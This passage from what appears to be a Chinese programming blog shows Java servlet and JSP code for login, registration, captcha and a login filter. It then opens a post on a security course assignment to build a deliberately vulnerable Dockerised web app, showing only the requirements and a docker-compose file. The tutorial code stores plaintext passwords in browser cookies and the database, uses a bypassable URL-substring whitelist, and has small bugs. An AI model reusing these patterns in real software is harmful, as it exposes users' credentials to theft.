    UserService userservice = <span class="hljs-keyword">new</span> UserService();
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;


        System.out.println(<span class="hljs-string">&quot;login&quot;</span>);
        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);

        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);

        User user = userservice.Login(username, password);

        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
            <span class="hljs-comment">// 登录成功，页面跳转到了 brand.jsp</span>
            <span class="hljs-comment">// 保存用户的session信息</span>
            <span class="hljs-comment">// 检查是否勾选记住密码</span>
            String remember = request.getParameter(<span class="hljs-string">&quot;remember&quot;</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(remember))&#123;
                Cookie c_username = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;username&quot;</span>, username);
                Cookie c_password = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;password&quot;</span>, password);
                c_username.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);
                c_password.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);

                <span class="hljs-comment">// 发送Cookie</span>
                response.addCookie(c_username);
                response.addCookie(c_password);
            &#125;

            HttpSession session = request.getSession();
            session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);


            <span class="hljs-comment">// 获取项目的虚拟路径</span>
            String contextPath = request.getContextPath();
            request.getRequestDispatcher( <span class="hljs-string">&quot;/brand.html&quot;</span>).forward(request,response);

        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// 登录失败，在页面显示登录失败的提示信息</span>
            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
        &#125;


    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>

<h4 id="前端实现-7"><a href="#前端实现-7" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginDiv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 350px&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/brand-case/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span><span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginMsg&quot;</span>&gt;</span>LOGIN IN<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;errorMsg&quot;</span>&gt;</span>$&#123;login_msg&#125; $&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.username.value&#125;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.password.value&#125;&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Remember:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;subDiv&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login up&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;register.jsp&quot;</span>&gt;</span>没有账号？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>



<h3 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h3><h4 id="后端实现-8"><a href="#后端实现-8" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-8"><a href="#dao-8" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询是否存在相同的用户名</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span>
<span class="hljs-function">User <span class="hljs-title">selectUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span></span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 用户注册</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addUser</span><span class="hljs-params">(User user)</span></span>;
</code></pre>

<h5 id="service-8"><a href="#service-8" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 注册功能</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">Register</span><span class="hljs-params">(User user)</span></span>&#123;
    SqlSession session = sqlSessionFactory.openSession();
    UserMapper mapper = session.getMapper(UserMapper.class);
    User u = mapper.selectUser(user.getUsername());

    <span class="hljs-keyword">if</span>(u == <span class="hljs-keyword">null</span>)&#123;
        mapper.addUser(user);
        session.commit();
    &#125;
    session.commit();
    <span class="hljs-keyword">return</span> u == <span class="hljs-keyword">null</span>;
&#125;</code></pre>

<h5 id="servlet-8"><a href="#servlet-8" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> com.itheima.service.UserService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/register&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-comment">// 因为UserService可能多次用到 所以变成成员变量 减少创建的次数</span>
    UserService userservice = <span class="hljs-keyword">new</span> UserService();
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;

        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);

        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);
        String checkCode1 = request.getParameter(<span class="hljs-string">&quot;checkCode&quot;</span>);

        User user = <span class="hljs-keyword">new</span> User();
        user.setUsername(username);
        user.setPassword(password);

        <span class="hljs-comment">// 获取生成的验证码信息</span>
        HttpSession session = request.getSession();
        String checkCode =(String) session.getAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>);
        <span class="hljs-comment">// 比较用户输入的验证码</span>
        <span class="hljs-comment">// 细节：checkCode为程序中定义的变量 比较时放在前面，否则可能出现空指针错误</span>
        <span class="hljs-keyword">if</span>(!checkCode.equals(checkCode1))&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>, <span class="hljs-string">&quot;验证码错误，请重新输入！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/register.jsp&quot;</span>).forward(request,response);
            <span class="hljs-comment">// 禁止注册</span>
            <span class="hljs-keyword">return</span> ;
        &#125;


        <span class="hljs-keyword">boolean</span> flag = userservice.Register(user);
        <span class="hljs-keyword">if</span>(flag)&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请登录！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
        &#125;<span class="hljs-keyword">else</span>&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请重试！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/regsiter.jsp&quot;</span>).forward(request,response);
        &#125;

    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>

<h4 id="前端实现-8"><a href="#前端实现-8" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;reg-content&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎注册<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已有帐号？<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;login.jsp&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg-form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span>&gt;</span>$&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>

            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span>密码格式有误<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>


            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>验证码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkCode&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCode&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCodeImg&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/checkCode&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;changeImg&quot;</span>&gt;</span>看不清？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;注 册&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg_btn&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clear&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;changeImgg&quot;</span>).onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span>
<span class="javascript">        <span class="hljs-comment">//路径后面添加时间戳的目的是避免浏览器进行缓存静态资源</span></span>
<span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;checkCodeImg&quot;</span>).src = <span class="hljs-string">&quot;/checkCode?&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getMilliseconds();</span>
    &#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<h3 id="验证码模块"><a href="#验证码模块" class="headerlink" title="验证码模块"></a>验证码模块</h3><p>借助验证码生成工具</p>
<p>在<code>src/main/java/com/itheima/util</code>引入生成验证码的类</p>
<p>将验证码显示在页面上</p>
<p>在<code>src/main/java/com/itheima/servler/web</code>创建CheckCodeServlet</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.service.BrandService;

<span class="hljs-keyword">import</span> com.itheima.util.CheckCodeUtil;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/checkCode&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckCodeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
    <span class="hljs-keyword">private</span> BrandService brandService = <span class="hljs-keyword">new</span> BrandService();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;

        <span class="hljs-comment">// 生成验证码</span>
        <span class="hljs-comment">// 获取响应输出流</span>
        ServletOutputStream os = response.getOutputStream();
        <span class="hljs-comment">// 生成验证码图片显示在jsp页面上</span>
        String checkCode = CheckCodeUtil.outputVerifyImage(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, os, <span class="hljs-number">4</span>);

        <span class="hljs-comment">// 将生成的验证码信息发送到 /register 用于验证用户输入的验证码是否正确</span>
        <span class="hljs-comment">// 将验证码存入session</span>
        HttpSession codeSession = request.getSession();
        codeSession.setAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>, checkCode);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        doGet(request, response);
    &#125;
&#125;</code></pre>

<h3 id="权限验证"><a href="#权限验证" class="headerlink" title="权限验证"></a>权限验证</h3><p>使用javaweb的三大组件 <code>filer</code>实现</p>
<p>在<code>src/main/java/com/itheima/servler/web/filter</code>中创建<code>LoginFilter</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.web.filter;

<span class="hljs-keyword">import</span> javax.servlet.*;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-comment">//@WebFilter(&quot;/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        <span class="hljs-comment">// 放行登录相关的资源</span>
        String urls[] = &#123;<span class="hljs-string">&quot;/login.jsp&quot;</span>, <span class="hljs-string">&quot;/css/&quot;</span>, <span class="hljs-string">&quot;/imgs/&quot;</span>, <span class="hljs-string">&quot;register.jsp&quot;</span>,<span class="hljs-string">&quot;/checkCode&quot;</span>,<span class="hljs-string">&quot;/register&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>&#125;;

        HttpServletRequest req = (HttpServletRequest) request;
        StringBuffer requestURL = req.getRequestURL();
        String url = requestURL.toString();
        <span class="hljs-keyword">for</span>(String u :urls )&#123;
            <span class="hljs-keyword">if</span>(url.contains(u))&#123;
                chain.doFilter(request,response);
                <span class="hljs-keyword">return</span> ;
            &#125;

        &#125;

        HttpSession session = req.getSession();
        Object user = session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);
        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
            chain.doFilter(request, response);
        &#125;<span class="hljs-keyword">else</span> &#123;

            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>, <span class="hljs-string">&quot;您尚未登录！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(req, response);
        &#125;

    &#125;
&#125;
</code></pre>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
        <tag>servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>mycms</title>
    <url>/2021/03/21/mycms/</url>
    <content><![CDATA[<p>网络安全与攻击实验课程作业</p>
<span id="more"></span>

<p>[TOC]</p>
<h1 id="课程要求"><a href="#课程要求" class="headerlink" title="课程要求"></a>课程要求</h1><p>基于 Linux 操作系统（如 Ubuntu），使用 Docker 容器，选择一门自己擅长的语言（只能从 PHP、JAVA、Python 中选择）及其当前流行的开发框架（如 Java 的 Struts2、Spring、Hibernate，Python的 Django、flask，PHP 的 ThinkPHP 等） 开发一个 Web 应用系统。</p>
<p>具体要求：</p>
<blockquote>
<p>1）该系统需内置典型的 Web 漏洞（不少于 10 种，每种可有多个）。必须包含 SQL 注入、XSS、文件上传、文件包含、命令执行、XXE和反序列化。 </p>
<p>2）基于 Docker 容器发布系统，并完成内置典型漏洞的攻击过程。</p>
<p>3）将原有漏洞页面进行完善（不能直接在原有漏洞页面修改，需重新创建修复漏洞的页面）以修复所有漏洞，并通过测试证明漏</p>
<p>洞已经修复。</p>
</blockquote>
<h1 id="网站开发"><a href="#网站开发" class="headerlink" title="网站开发"></a>网站开发</h1><h2 id="1-开发工具"><a href="#1-开发工具" class="headerlink" title="1.开发工具"></a>1.开发工具</h2><p>phpstorm+vscode</p>
<p>phpstorm 重要用于对php代码的代码编写和修改，其提供了十分丰富的功能，帮助开发者快速修改代码，提供代码定位，能够快速的定位到某个函数所属文件，大大提高了工作效率。</p>
<p>而vscode则负责查看文件内容，其相对于PHP storm比较轻量，占用内存小，速度快。</p>
<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>使用docker以及docker-compose</p>
<p>具体为mysql 5.6 + nginx +php7.1</p>
<p>其中docker-compose.yml</p>
<pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">nginx:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/nginx:latest</span>
  	 <span class="hljs-comment"># 下载镜像的源，这里选择网易的镜像源，可以提高下载的速度， latest是最新版本</span>
    <span class="hljs-attr">ports:</span> 
      <span class="hljs-bullet">-</span> <span class="hljs-number">80</span><span class="hljs-string">:80</span>
     <span class="hljs-comment"># 端口映射</span>
      <span class="hljs-bullet">-</span> <span class="hljs-number">443</span><span class="hljs-string">:443</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/nginx.conf:/etc/nginx/nginx.conf</span>
      <span class="hljs-comment">#nginx的配置文件路径</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/conf.d:/etc/nginx/conf.d</span>
     <span class="hljs-comment"># 其他的配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
      <span class="hljs-comment">#目录映射  src作为网站的根目录，网站的所有文件需要放在这里</span>
  <span class="hljs-attr">php:</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">./php</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
      <span class="hljs-comment">#根目录</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php.ini:/usr/local/etc/php/php.ini</span>
      <span class="hljs-comment"># php的配置文件</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf</span> 
  <span class="hljs-attr">mysql:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/mysql:5.6</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/data:/var/lib/mysql</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/my.cnf:/etc/mysql/conf.d/my.cnf</span>
